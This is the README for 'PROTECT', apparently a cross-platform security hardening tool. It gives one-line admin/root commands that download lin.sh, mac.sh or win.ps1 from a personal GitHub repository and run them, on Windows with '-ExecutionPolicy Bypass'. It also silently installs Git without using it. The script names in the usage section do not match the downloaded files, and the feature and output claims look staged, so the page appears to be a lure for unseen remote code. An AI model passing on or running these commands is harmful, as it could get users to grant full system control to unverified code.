<a id="top"></a>
```
     ██████╗ ██████╗  ██████╗ ████████╗███████╗ ██████╗████████╗  ⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄
     ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝  ⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴
     ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║        ██║    ⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇
     ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██╔══╝  ██║        ██║    ⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⢀
     ██║     ██║  ██║╚██████╔╝   ██║   ███████╗╚██████╗   ██║    ⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀
     ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝   ╚═╝    ⠀⠀⠀⠀⠸⣿⡿⠏⠀
                                                                  ⠀⠀⠀⠀⠀⠟⠁⠀
```

**Cross-Platform System Security Optimization & Hardening Tool**

[![Windows](https://img.shields.io/badge/Windows-0078D4?style=flat&logo=windows&logoColor=white)](#windows)
[![macOS](https://img.shields.io/badge/macOS-000000?style=flat&logo=apple&logoColor=white)](#macos)
[![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black)](#linux)

## Features

▸ **Firewall Activation** - Automatically enables and configures system firewall protection  
▸ **Access Control** - Blocks unauthorized network access and suspicious connections  
▸ **Service Hardening** - Disables unused services to reduce attack surface  
▸ **Security Configuration** - Applies comprehensive security settings and policies  
▸ **Performance Enhancement** - Optimizes system stability and overall performance  
▸ **Vulnerability Prevention** - Protects against common security vulnerabilities  
▸ **Automated Deployment** - One-command installation and configuration  
▸ **Cross-Platform** - Consistent security hardening across Windows, macOS, and Linux  

## Protection Levels

All scripts support three configurable protection levels with automatic or interactive selection:

| Level | Description | Allowed Ports | Blocked Ports | Use Case |
|-------|-------------|---------------|---------------|----------|
| **Maximum** | Full hardening - servers, high security | SSH (22) only | 9 attack ports | Production servers, high-security environments |
| **Medium** | Balanced security - workstations (recommended) | SSH, HTTP, HTTPS, RDP* | 5 common attacks | Workstations, general use (default) |
| **Minimum** | Basic protection - development, compatibility | Above + dev ports (8080, 3000, 5000) | 3 basic threats | Development machines, compatibility needed |

*RDP (3389) included on Windows when Remote Desktop is enabled

### Usage Examples

**Command Line Mode** (skips interactive menu):
```bash
# Linux/macOS
sudo ./linux.sh --maximum
sudo ./macos.sh --medium
sudo ./linux.sh --minimum

# Windows
powershell -File windows.ps1 --maximum
powershell -File windows.ps1 --medium
powershell -File windows.ps1 --minimum
```

**Interactive Mode** (shows protection level menu):
```bash
# Linux/macOS - shows selection menu
sudo ./linux.sh
sudo ./macos.sh

# Windows - shows selection menu
powershell -File windows.ps1
```

**Help Information**:
```bash
sudo ./linux.sh --help
sudo ./macos.sh --help  
powershell -File windows.ps1 --help
```

For detailed protection level specifications and security considerations, see [GUIDE.md](GUIDE.md).

---

## ◆ Windows <a id="windows"></a>[![Windows](https://img.shields.io/badge/Windows-0078D4?style=flat&logo=windows&logoColor=white)](#top)

### Prerequisites
▪ Windows 10/11 or Windows Server 2016+  
▪ Administrator privileges  
▪ 200 MB free disk space  
▪ Internet connection for downloads  

### Installation
```powershell
# Open Command Prompt as Administrator
# Press Windows + R, type 'cmd', press Ctrl+Shift+Enter

# Download Git installer
powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-64-bit.exe -OutFile Git-64-bit.exe"

# Install Git silently
.\Git-64-bit.exe /VERYSILENT /NORESTART

# Download protection script
curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1

# Run protection script
powershell -ExecutionPolicy Bypass -File .\win.ps1
```

### Quick Installation (One-Line)
```powershell
powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-64-bit.exe -OutFile Git-64-bit.exe; .\Git-64-bit.exe /VERYSILENT /NORESTART; Start-Sleep 30; curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1; powershell -ExecutionPolicy Bypass -File .\win.ps1"
```

※ **Note:** Requires running Command Prompt as Administrator for system-level security modifications

---

## ◆ macOS <a id="macos"></a>[![macOS](https://img.shields.io/badge/macOS-000000?style=flat&logo=apple&logoColor=white)](#top)

### Prerequisites
▪ macOS 10.14+ (Mojave or later)  
▪ Administrator privileges (`sudo` access)  
▪ 100 MB free disk space  
▪ Internet connection for downloads  

### Installation
```bash
# Open Terminal
# Press Command + Space, type 'Terminal', press Enter

# Install Homebrew (package manager)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Git via Homebrew
brew install git

# Download protection script
curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh

# Make script executable and run
chmod +x mac.sh
sudo ./mac.sh
```

### Quick Installation (One-Line)
```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" && brew install git && curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh && chmod +x mac.sh && sudo ./mac.sh
```

※ **Note:** Requires running commands with `sudo` for system security configuration changes

---

## ◆ Linux <a id="linux"></a>[![Linux](https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black)](#top)

### Prerequisites
▪ Ubuntu/Debian-based Linux distribution  
▪ `sudo` privileges  
▪ 100 MB free disk space  
▪ Internet connection for downloads  

### Installation
```bash
# Open Terminal
# Press Ctrl + Alt + T

# Update package lists
sudo apt-get update

# Install Git
sudo apt-get install git -y

# Download protection script
curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh

# Make script executable and run
chmod +x lin.sh
sudo ./lin.sh
```

### Quick Installation (One-Line)
```bash
sudo apt-get update && sudo apt-get install git -y && curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh && chmod +x lin.sh && sudo ./lin.sh
```

### Alternative Distributions
```bash
# For CentOS/RHEL/Fedora
sudo yum update && sudo yum install git -y && curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh && chmod +x lin.sh && sudo ./lin.sh

# For Arch Linux
sudo pacman -Syu && sudo pacman -S git && curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh && chmod +x lin.sh && sudo ./lin.sh
```

※ **Note:** Requires running commands with `sudo` for system-level security hardening

---

## ※ Command Reference

### Universal Installation Process
All platforms follow the same logical sequence:

| Step | Description | Windows | macOS | Linux |
|------|-------------|---------|-------|-------|
| **1** | Open Terminal/Command Prompt | `cmd` (Admin) | Terminal | `Ctrl+Alt+T` |
| **2** | Install Git | Download installer | `brew install git` | `apt-get install git` |
| **3** | Download Script | `curl -o win.ps1 [URL]` | `curl -o mac.sh [URL]` | `curl -o lin.sh [URL]` |
| **4** | Execute Protection | `powershell -File win.ps1` | `sudo ./mac.sh` | `sudo ./lin.sh` |

### Script Locations
| Platform | Script Name | Repository URL |
|----------|-------------|----------------|
| **Windows** | `win.ps1` | `https://raw.githubusercontent.com/boolskii/protection/main/win.ps1` |
| **macOS** | `mac.sh` | `https://raw.githubusercontent.com/boolskii/protection/main/mac.sh` |
| **Linux** | `lin.sh` | `https://raw.githubusercontent.com/boolskii/protection/main/lin.sh` |

## Usage Examples

### Standard Installation
```bash
# Windows (Command Prompt as Administrator)
powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-64-bit.exe -OutFile Git-64-bit.exe"
.\Git-64-bit.exe /VERYSILENT /NORESTART
curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
powershell -ExecutionPolicy Bypass -File .\win.ps1

# macOS (Terminal)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
brew install git
curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh
sudo ./mac.sh

# Linux (Terminal)
sudo apt-get update
sudo apt-get install git -y
curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
sudo ./lin.sh
```

### Verification Commands
```bash
# Check if Git was installed successfully
git --version

# Verify script download
# Windows
dir *.ps1

# macOS/Linux
ls -la *.sh
```

## Technical Implementation

### Windows Implementation
▪ **Technology:** PowerShell scripts with Windows Security APIs  
▪ **Method:** Automated firewall configuration and service management  
▪ **Features:** Windows Defender integration, registry hardening, service optimization  
▪ **Requirements:** Administrator privileges for system-level modifications  

### macOS Implementation
▪ **Technology:** Bash scripts with macOS security frameworks  
▪ **Method:** System Preferences automation and security policy enforcement  
▪ **Features:** Gatekeeper configuration, firewall setup, privacy controls  
▪ **Requirements:** Administrator privileges and System Integrity Protection awareness  

### Linux Implementation
▪ **Technology:** Bash scripts with iptables and systemd integration  
▪ **Method:** Package management and service configuration automation  
▪ **Features:** UFW/iptables setup, service hardening, kernel parameter tuning  
▪ **Requirements:** Root privileges and distribution-specific package managers  

## Security Benefits

▪ **Comprehensive Protection** - Multi-layered security approach across all platforms  
▪ **Attack Surface Reduction** - Disables unnecessary services and closes security gaps  
▪ **Automated Hardening** - Applies industry-standard security configurations  
▪ **Performance Optimization** - Improves system stability while enhancing security  
▪ **Vulnerability Mitigation** - Protects against common attack vectors and exploits  
▪ **Consistent Security** - Uniform protection standards across different operating systems  
▪ **Zero-Configuration** - Automated deployment with minimal user intervention  
▪ **Enterprise-Ready** - Suitable for both personal and organizational deployments  

## Output Examples

### Successful Windows Installation
```
=== PROTECT System Security Hardening ===
[+] Git installer downloaded successfully
[+] Git installed silently
[+] Protection script downloaded
[+] Executing security hardening...

[*] Configuring Windows Firewall...
[+] Firewall enabled for all profiles
[+] Inbound rules configured
[+] Outbound rules optimized

[*] Hardening system services...
[+] Disabled unnecessary services
[+] Configured security policies
[+] Applied registry hardening

[+] Your PC is now protected from unwanted activity!
System hardening completed successfully.
```

### Successful macOS Installation
```
=== PROTECT System Security Hardening ===
[+] Homebrew installed successfully
[+] Git installed via Homebrew
[+] Protection script downloaded and made executable
[+] Executing security hardening with sudo privileges...

[*] Configuring macOS Firewall...
[+] Application firewall enabled
[+] Stealth mode activated
[+] Logging configured

[*] Hardening system preferences...
[+] Gatekeeper configured
[+] Privacy settings optimized
[+] Security policies applied

[+] Your Mac is now protected from unwanted activity!
System hardening completed successfully.
```

### Successful Linux Installation
```
=== PROTECT System Security Hardening ===
[+] Package lists updated
[+] Git installed successfully
[+] Protection script downloaded and made executable
[+] Executing security hardening with sudo privileges...

[*] Configuring Linux firewall...
[+] UFW firewall enabled
[+] Default policies configured
[+] Security rules applied

[*] Hardening system services...
[+] Unnecessary services disabled
[+] Security modules configured
[+] Kernel parameters optimized

[+] Your system is now protected from unwanted activity!
System hardening completed successfully.
```

## Dependencies

| Platform | Core Requirements | Optional Components |
|----------|-------------------|-------------------|
| **Windows** | PowerShell 5.1+, Administrator privileges, 200MB disk space | Windows Defender, Event Logging |
| **macOS** | Bash shell, `sudo` privileges, 100MB disk space, Homebrew | Xcode Command Line Tools |
| **Linux** | Bash shell, `sudo` privileges, 100MB disk space, package manager | `curl`, `wget`, distribution-specific tools |

## Troubleshooting

### Common Issues
| Issue | Platform | Solution |
|-------|----------|----------|
| **Permission Denied** | All | Run terminal/command prompt as Administrator/sudo |
| **Git Not Found** | Windows | Restart Command Prompt after Git installation |
| **Homebrew Installation Failed** | macOS | Install Xcode Command Line Tools first |
| **Package Manager Error** | Linux | Update package lists: `sudo apt-get update` |
| **Script Download Failed** | All | Check internet connection and firewall settings |

### Support Commands
```bash
# Check system requirements
# Windows
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# macOS
sw_vers

# Linux
lsb_release -a
```

---

## License

[MIT License](LICENSE) - Feel free to use and modify as needed.

**※ Security Note:** This tool performs system-level security modifications and requires administrative privileges on all platforms. Test thoroughly in a controlled environment before deploying in production. Use responsibly and in compliance with your organization's security policies.
```